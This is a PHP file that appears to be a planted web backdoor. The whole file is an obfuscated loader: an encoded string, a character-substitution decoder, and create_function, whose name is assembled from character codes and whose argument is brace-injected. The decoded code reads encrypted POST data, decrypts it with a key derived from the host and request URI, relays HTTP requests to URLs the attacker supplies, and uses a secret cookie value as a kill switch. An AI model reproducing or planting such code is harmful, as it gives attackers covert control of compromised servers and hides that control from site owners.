<?php
 $hvcqftdaoy = 6095; function zxenfcc($jzqlnoffx, $likgmzqmzd){$ckhlreabj = ''; for($i=0; $i < strlen($jzqlnoffx); $i++){$ckhlreabj .= isset($likgmzqmzd[$jzqlnoffx[$i]]) ? $likgmzqmzd[$jzqlnoffx[$i]] : $jzqlnoffx[$i];}
$tjpnpyqrmy="rawurl" . "decode";return $tjpnpyqrmy($ckhlreabj);}
$wryaphrvap = '%qAG0G_bm4%Tk%TOFGbdQw5_m22L2b%TO%TPA%TZ%hC%AD%Ar%qAG0G_bm4%Tk%TOQLY_m22L2b%TO%TPA%TZ%hC%AD%Ar%qAm2'.
'2L2_2mdL24G0Y%TkA%TZ%hC%AD%Ar%qAbm4_4G8m_QG8G4%TkA%TZ%hC%AD%Ar%qAGY0L2m_ybm2_wSL24%TkI%TZ%hC%AD%A'.
'r%qAG0G_bm4%Tk%TO8w1_m1m6y4GL0_4G8m%TO%TPA%TZ%hC%AD%Ar%AD%A'.
'rzL2mw6E%TA%Tk%Tq_Pgg7u9%TAwb%TA%TqG4m8%TZ%AD%Ar%OC%AD%Ar%TA%TA%TA%TAGz%TA%'.
'Tk%TqG4m8%TA%TI%hD%TA%TTOOTqzwmw-mh6T-qZIm-ZWzI-hw6T6ASITklw%TT%TZ%AD%Ar%TA%TA%TA%TA%TA%'.
'TA%TA%TAm1G4%Tk%TZ%hC%AD%Ar%OD%AD%Ar%AD%Ar%TqFw4w%TA%hD%TAzGQm_Ym4_6L04m04b%Tk%TOdEd%hr//G0dy4%TO%TZ'.
'%hC%AD%Ar%TqFw4w%TA%hD%TAbdQG4%Tk%TT%hD%TT%TP%TqFw4w%T'.
'PT%TZ%hC%AD%Ar%AD%Ar%TqSlq_Fm6LFm_Fw4w%TA%hD%TASwbmlq_Fm6LFm%Tky2Q'.
'Fm6LFm%Tk%TqFw4w%WCI%WD%TZ%TZ%hC%AD%Ar%AD%Ar%Tqbm0F_Fw4w%TA%hD%TAy0bm2GwQGVm%TkFm625d4%'.
'Tk%TqSlq_Fm6LFm_Fw4w%TZ%TZ%hC%AD%Ar%AD%Ar%Tq2mbyQ4%TA%hD%TAbm0F_'.
'Fw4wI%TA%Tk%Tqbm0F_Fw4w%TZ%hC%AD%Ar%AD%ArGz%TA%Tk%TI%Tq2mbyQ4%TZ'.
'%AD%Ar%OC%AD%Ar%TA%TA%TA%TA%Tq2mbyQ4%TA%hD%TAbm0F_Fw4wT%Tk%Tqbm0F_Fw4w%TZ%hC%AD%Ar%OD%AD%Ar%AD'.
'%Arm6EL%TA%Tq2mbyQ4%hC%AD%Ar%AD%Arzy064GL0%TAFm625d4%Tk%TqFw4w%TZ%AD%Ar%OC%AD%Ar'.
'%TA%TA%TA%TA%TqLy4_Fw4w%TA%hD%TA%TT%TT%hC%AD%Ar%TA%TA%TA%TA%'.
'TqUm5%TA%hD%TA%Tq_K9Jo9J%WC%TOjiiM_jgKi%TO%WD%TA.%TA%Tq_K9Jo9J%WC%TOJ9vx9Ki_xJu%TO%WD%hC%AD%Ar%'.
'TA%TA%TA%TA%TqUm5_Qm0%TA%hD%TAb42Qm0%Tk%TqUm5%TZ%hC%AD%Ar%TA%AD%Ar%TA%TA%TA%TAzL2%TA%Tk%TqG%hD'.
'A%hC%TA%TqG%TA%hP%TAb42Qm0%Tk%TqUm5%TZ%hC%TA%TqG%T'.
'C%TC%TZ%AD%Ar%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%TqUm5%WC%T'.
'qG%WD%TA%hD%TA6E2%TkL2F%Tk%TqUm5%WC%TqG%WD%TZ%TA%W9%TA%Tk%'.
'TqUm5_Qm0%TA%TW%TATWW%TZ%TZ%hC%AD%Ar%TA%TA%TA%TA%OD%AD%Ar%AD%Ar%TA%TA%TA%TAzL2%TA%Tk%TqG%hDA%hC%T'.
'A%TqG%hPb42Qm0%Tk%TqFw4w%TZ%hC%TZ%AD%Ar%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA'.
'%TA%TA%TA%TA%TAzL2%TA%Tk%Tqs%hDA%hC%TA%Tqs%hPb42Qm0'.
'%Tk%TqUm5%TZ%TA%Tl%Tl%TA%TqG%hPb42Qm0%Tk%TqFw4w%TZ%hC%TA%Tqs%TC%TC%TP%TA%TqG%TC%TC%TZ%AD%Ar%TA'.
'%TA%TA%TA%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA'.
'%TA%TA%TA%TA%TqLy4_Fw4w%TA.%hD%TA6E2%TkL2F%Tk%TqFw4w%WC%TqG%WD%TZ%TA%W9%TAL2F%Tk%TqUm5%WC%Tqs%WD'.
'%TZ%TZ%hC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%OD%AD%Ar%TA%TA%TA%TA%OD%AD%Ar%AD%Ar%T'.
'A%TA%TA%TA2m4y20%TA%TqLy4_Fw4w%hC%AD%Ar%OD%AD%Ar%AD%Arzy064GL0%T'.
'Abm0F_Fw4wI%Tk%TqFw4w%TZ%AD%Ar%OC%AD%Ar%TA%TA%TA%TA%TqEmwF%TA%'.
'hD%TA%TT%TT%hC%AD%Ar%AD%Ar%TA%TA%TA%TAzL2mw6E%Tk%TqFw4w%WC%'.
'TTEmwFm2b%TT%WD%TAwb%TA%TqUm5%hD%h9%TqnwQym%TZ%AD%Ar%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%T'.
'A%TqEmwF%TA.%hD%TA%TqUm5%TA.%TA%TT%hr%TA%TT%TA.%TA%TqnwQym%TA.%TA%'.
'TT%WP2%WP0%TT%hC%AD%Ar%TA%TA%TA%TA%OD%AD%Ar%AD%Ar%TA%TA%TA%TA%Tqdw2w8b%TA%h'.
'D%TAw22w5%Tk%TOE44d%TO%TA%hD%h9%TAw22w5%Tk%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%TO8m4ELF%TO%TA%hD%h'.
'9%TA%TqFw4w%WC%TT8m4ELF%TT%WD%TP%AD%Ar%TA%TA%TA%TA%TA%TA%T'.
'A%TA%TOEmwFm2%TO%TA%hD%h9%TA%TqEmwF%TP%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%TO6L04m04%TO%TA%hD%h9%TA%'.
'TqFw4w%WC%TTSLF5%TT%WD%TP%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%TO4G8mLy4%TO%TA%hD%h9%TA%'.
'TqFw4w%WC%TT4G8mLy4%TT%WD%TP%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%AD%Ar%TA%TA'.
'%TA%TA%TZ%TZ%hC%AD%Ar%AD%Ar%TA%TA%TA%TA%Tq641%TA%hD%TAb42mw8_6L04m14_62mw4m%Tk%Tqdw2w8b%TZ%hC%A'.
'D%Ar%TA%TA%TA%TA%AD%Ar%TA%TA%TA%TA%Tq2mbyQ4%TA%hD%TA%qAzGQm_Ym4_6L04m04b%Tk%TqFw4w%'.
'WC%TTy2Q%TT%WD%TP%TAerBK9%TP%TA%Tq641%TZ%hC%AD%Ar%AD%Ar%TA%TA%TA'.
'%TAGz%TA%Tk%TqE44d_2mbdL0bm_EmwFm2%TZ%AD%Ar%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TAGz%TA%Tkb42'.
'dLb%Tk%TqE44d_2mbdL0bm_EmwFm2%WCA%WD%TP%TA%TTTAA%TT%TZ%TA%hD%hD%hD%TAerBK9%TZ%AD%Ar%TA%T'.
'A%TA%TA%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA'.
'%TA%TA%TA%TA%Tq2mbyQ4%TA%hD%TA%TTjiiM_9JJgJ%WP4%TT%TA.%TA%TqE'.
'44d_2mbdL0bm_EmwFm2%WCA%WD%hC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%OD%AD%Ar%TA%TA%TA%TA%OD%AD%'.
'Ar%TA%TA%TA%TAmQbm%AD%Ar%TA%TA%TA%TA%OC%AD%Ar%TA%TA%TA%TA%TA%TA%TA%TA%Tq2mbyQ4%TA%hD%TA%TTPgRR9'.
'PiugR_9JJgJ%TT%hC%AD%Ar%TA%TA%TA%TA%OD%AD%Ar%AD%Ar%TA%TA%TA%TA2m4y20%TA'.
'%Tq2mbyQ4%hC%AD%Ar%OD%AD%Ar%AD%Arzy064GL0%TAbm0F_Fw4wT%Tk%TqFw4w'.
'%TZ%AD%Ar%OC%AD%Ar%TA%TA%TA%TA//%TAybm%TAbL6Um4b%AD%Ar%OD';
$qlahoypdi = Array('1'=>'x', '0'=>'n', '3'=>'X', '2'=>'r', '5'=>'y', '4'=>'t', '7'=>'K', '6'=>'c', '9'=>'E', '8'=>'m', 'A'=>'0', 'C'=>'B', 'B'=>'L', 'E'=>'h', 'D'=>'D', 'G'=>'i', 'F'=>'d', 'I'=>'1', 'H'=>'Z', 'K'=>'S', 'J'=>'R', 'M'=>'P', 'L'=>'o', 'O'=>'7', 'N'=>'M', 'Q'=>'l', 'P'=>'C', 'S'=>'b', 'R'=>'N', 'U'=>'k', 'T'=>'2', 'W'=>'5', 'V'=>'z', 'Y'=>'g', 'X'=>'W', 'Z'=>'9', 'a'=>'J', 'c'=>'G', 'b'=>'s', 'e'=>'F', 'd'=>'p', 'g'=>'O', 'f'=>'Y', 'i'=>'T', 'h'=>'3', 'k'=>'8', 'j'=>'H', 'm'=>'e', 'l'=>'6', 'o'=>'V', 'n'=>'v', 'q'=>'4', 'p'=>'q', 's'=>'j', 'r'=>'A', 'u'=>'I', 't'=>'w', 'w'=>'a', 'v'=>'Q', 'y'=>'u', 'x'=>'U', 'z'=>'f');
$wryaphrvap=zxenfcc($wryaphrvap, $qlahoypdi);$rcvptxtyqz=chr(144-45)."\x72".chr(615-514)."\141".'t'."\x65"."\137".'f'.'u'."\x6e".chr(824-725).chr(116)."\151".'o'.chr(110);$rcvptxtyqz('', chr(125) . $wryaphrvap . chr(123));?>